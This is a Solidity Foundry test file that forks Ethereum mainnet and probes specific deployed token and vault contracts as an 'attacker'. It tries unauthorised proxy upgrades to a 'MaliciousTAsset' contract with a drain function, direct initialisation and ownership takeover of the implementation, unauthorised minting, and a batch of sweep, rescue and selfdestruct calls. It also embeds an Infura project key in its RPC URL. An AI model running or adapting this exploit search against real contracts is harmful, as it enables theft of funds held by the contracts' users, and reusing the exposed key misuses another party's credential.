// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IUpgradeable {
    function proxiableUUID() external view returns (bytes32);
    function upgradeToAndCall(address newImplementation, bytes memory data) external;
    function upgradeTo(address newImplementation) external;
}

contract TAssetProxyExploit is Test {
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    // EIP-1967 slots
    bytes32 constant IMPL_SLOT = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
    bytes32 constant ADMIN_SLOT = bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1);
    bytes32 constant BEACON_SLOT = bytes32(uint256(keccak256("eip1967.proxy.beacon")) - 1);

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeTAssetProxy() public view {
        console.log("=== TASSET PROXY ANALYSIS ===\n");

        // Read implementation slot
        bytes32 implSlot = vm.load(TASSET, IMPL_SLOT);
        address impl = address(uint160(uint256(implSlot)));
        console.log("TASSET Implementation:", impl);

        // Read admin slot
        bytes32 adminSlot = vm.load(TASSET, ADMIN_SLOT);
        address admin = address(uint160(uint256(adminSlot)));
        console.log("TASSET Admin:", admin);

        // Read beacon slot
        bytes32 beaconSlot = vm.load(TASSET, BEACON_SLOT);
        address beacon = address(uint160(uint256(beaconSlot)));
        console.log("TASSET Beacon:", beacon);

        // Check implementation details
        if (impl != address(0)) {
            console.log("\nImplementation code size:", impl.code.length);

            // Check if implementation is initializable
            bytes32 initSlot = vm.load(impl, bytes32(0));
            console.log("Impl slot 0:");
            console.logBytes32(initSlot);
        }
    }

    function test_AnalyzeIAUProxy() public view {
        console.log("=== IAU PROXY ANALYSIS ===\n");

        // Read implementation slot
        bytes32 implSlot = vm.load(IAU, IMPL_SLOT);
        address impl = address(uint160(uint256(implSlot)));
        console.log("IAU Implementation:", impl);

        // Read admin slot
        bytes32 adminSlot = vm.load(IAU, ADMIN_SLOT);
        address admin = address(uint160(uint256(adminSlot)));
        console.log("IAU Admin:", admin);

        // Check implementation
        if (impl != address(0)) {
            console.log("\nImplementation code size:", impl.code.length);
        }
    }

    function test_TryUpgradeTAsset() public {
        console.log("=== TRYING TO UPGRADE TASSET ===\n");

        vm.startPrank(attacker);

        // Deploy malicious implementation
        MaliciousTAsset malicious = new MaliciousTAsset(attacker);
        console.log("Malicious impl deployed:", address(malicious));

        // Try various upgrade methods
        console.log("\nTrying upgradeToAndCall...");
        try IUpgradeable(TASSET).upgradeToAndCall(address(malicious), "") {
            console.log("CRITICAL: upgradeToAndCall succeeded!");
        } catch Error(string memory reason) {
            console.log("Failed:", reason);
        } catch (bytes memory data) {
            console.log("Failed (raw):");
            if (data.length >= 4 && data.length < 100) {
                console.logBytes(data);
            }
        }

        console.log("\nTrying upgradeTo...");
        try IUpgradeable(TASSET).upgradeTo(address(malicious)) {
            console.log("CRITICAL: upgradeTo succeeded!");
        } catch Error(string memory reason) {
            console.log("Failed:", reason);
        } catch (bytes memory data) {
            console.log("Failed (raw):");
            if (data.length >= 4 && data.length < 100) {
                console.logBytes(data);
            }
        }

        vm.stopPrank();
    }

    function test_CheckImplementationDirectly() public {
        console.log("=== CHECK IMPLEMENTATION DIRECTLY ===\n");

        // Get implementation address
        bytes32 implSlot = vm.load(TASSET, IMPL_SLOT);
        address impl = address(uint160(uint256(implSlot)));
        console.log("Implementation:", impl);

        if (impl == address(0)) {
            console.log("No implementation set!");
            return;
        }

        vm.startPrank(attacker);

        // Try to initialize implementation directly
        console.log("\nTrying to initialize implementation directly...");

        (bool success,) = impl.call(
            abi.encodeWithSignature("initialize()")
        );
        console.log("initialize() success:", success);

        (success,) = impl.call(
            abi.encodeWithSignature("initialize(address)", attacker)
        );
        console.log("initialize(address) success:", success);

        (success,) = impl.call(
            abi.encodeWithSignature("initialize(string,string)", "Test", "TST")
        );
        console.log("initialize(string,string) success:", success);

        // Try transferOwnership on implementation
        (success,) = impl.call(
            abi.encodeWithSignature("transferOwnership(address)", attacker)
        );
        console.log("transferOwnership success:", success);

        // Check who owns implementation
        bytes memory ownerData;
        (success, ownerData) = impl.staticcall(
            abi.encodeWithSignature("owner()")
        );
        if (success && ownerData.length == 32) {
            address implOwner = abi.decode(ownerData, (address));
            console.log("Implementation owner:", implOwner);
        }

        vm.stopPrank();
    }

    function test_TAssetMintBurnAccess() public {
        console.log("=== TASSET MINT/BURN ACCESS CHECK ===\n");

        // Get implementation
        bytes32 implSlot = vm.load(TASSET, IMPL_SLOT);
        address impl = address(uint160(uint256(implSlot)));
        console.log("Implementation:", impl);

        // Check minter role
        (bool success, bytes memory data) = TASSET.staticcall(
            abi.encodeWithSignature("vault()")
        );
        if (success && data.length == 32) {
            address vault = abi.decode(data, (address));
            console.log("TASSET.vault():", vault);
        }

        // Check if there's a minter
        (success, data) = TASSET.staticcall(
            abi.encodeWithSignature("minter()")
        );
        if (success && data.length == 32) {
            address minter = abi.decode(data, (address));
            console.log("TASSET.minter():", minter);
        }

        // Check roles
        (success, data) = TASSET.staticcall(
            abi.encodeWithSignature("MINTER_ROLE()")
        );
        if (success && data.length == 32) {
            bytes32 role = abi.decode(data, (bytes32));
            console.log("MINTER_ROLE:");
            console.logBytes32(role);
        }

        vm.startPrank(attacker);

        // Try mint as attacker
        uint256 balanceBefore = IERC20(TASSET).balanceOf(attacker);
        console.log("\nAttacker TASSET balance before:", balanceBefore);

        (success,) = TASSET.call(
            abi.encodeWithSignature("mint(address,uint256)", attacker, 1000e18)
        );
        console.log("mint(attacker, 1000e18) success:", success);

        uint256 balanceAfter = IERC20(TASSET).balanceOf(attacker);
        console.log("Attacker TASSET balance after:", balanceAfter);

        if (balanceAfter > balanceBefore) {
            console.log("CRITICAL: Attacker gained TASSET tokens!");
        }

        vm.stopPrank();
    }

    function test_SearchForDangerousFunctions() public {
        console.log("=== SEARCHING FOR DANGEROUS FUNCTIONS ===\n");

        // Get implementation
        bytes32 implSlot = vm.load(TASSET, IMPL_SLOT);
        address impl = address(uint160(uint256(implSlot)));
        console.log("Implementation:", impl);

        vm.startPrank(attacker);

        // Try execute functions
        bytes[] memory selectors = new bytes[](15);
        selectors[0] = abi.encodeWithSignature("execute(address,bytes)", wstETH, "");
        selectors[1] = abi.encodeWithSignature("delegatecall(address,bytes)", wstETH, "");
        selectors[2] = abi.encodeWithSignature("call(address,bytes)", wstETH, "");
        selectors[3] = abi.encodeWithSignature("multicall(bytes[])", new bytes[](0));
        selectors[4] = abi.encodeWithSignature("selfDestruct(address)", attacker);
        selectors[5] = abi.encodeWithSignature("selfdestruct(address)", attacker);
        selectors[6] = abi.encodeWithSignature("destroy(address)", attacker);
        selectors[7] = abi.encodeWithSignature("kill(address)", attacker);
        selectors[8] = abi.encodeWithSignature("sweep(address,address)", wstETH, attacker);
        selectors[9] = abi.encodeWithSignature("rescue(address,address,uint256)", wstETH, attacker, 1e18);
        selectors[10] = abi.encodeWithSignature("rescueToken(address,address)", wstETH, attacker);
        selectors[11] = abi.encodeWithSignature("withdrawStuckTokens(address,address)", wstETH, attacker);
        selectors[12] = abi.encodeWithSignature("emergencyWithdraw(address,uint256)", wstETH, 1e18);
        selectors[13] = abi.encodeWithSignature("setVault(address)", attacker);
        selectors[14] = abi.encodeWithSignature("setMinter(address)", attacker);

        string[15] memory names = [
            "execute(address,bytes)",
            "delegatecall(address,bytes)",
            "call(address,bytes)",
            "multicall(bytes[])",
            "selfDestruct(address)",
            "selfdestruct(address)",
            "destroy(address)",
            "kill(address)",
            "sweep(address,address)",
            "rescue(address,address,uint256)",
            "rescueToken(address,address)",
            "withdrawStuckTokens(address,address)",
            "emergencyWithdraw(address,uint256)",
            "setVault(address)",
            "setMinter(address)"
        ];

        console.log("Testing on TASSET proxy...");
        for (uint i = 0; i < selectors.length; i++) {
            (bool success,) = TASSET.call(selectors[i]);
            if (success) {
                console.log("  SUCCESS:", names[i]);
            }
        }

        console.log("\nTesting on implementation...");
        if (impl != address(0)) {
            for (uint i = 0; i < selectors.length; i++) {
                (bool success,) = impl.call(selectors[i]);
                if (success) {
                    console.log("  SUCCESS:", names[i]);
                }
            }
        }

        vm.stopPrank();
    }

    function test_CheckAllSlots() public view {
        console.log("=== CHECKING ALL STORAGE SLOTS ===\n");

        console.log("TASSET storage:");
        for (uint i = 0; i < 15; i++) {
            bytes32 slot = vm.load(TASSET, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("  Slot", i);
                console.logBytes32(slot);
            }
        }

        // Check special slots
        bytes32 implSlot = vm.load(TASSET, IMPL_SLOT);
        console.log("\nImplementation slot:");
        console.logBytes32(implSlot);

        bytes32 adminSlot = vm.load(TASSET, ADMIN_SLOT);
        console.log("Admin slot:");
        console.logBytes32(adminSlot);

        bytes32 beaconSlot = vm.load(TASSET, BEACON_SLOT);
        console.log("Beacon slot:");
        console.logBytes32(beaconSlot);
    }
}

contract MaliciousTAsset {
    address public attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    function proxiableUUID() external pure returns (bytes32) {
        return bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
    }

    function drain(address token) external {
        uint256 balance = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(attacker, balance);
    }
}
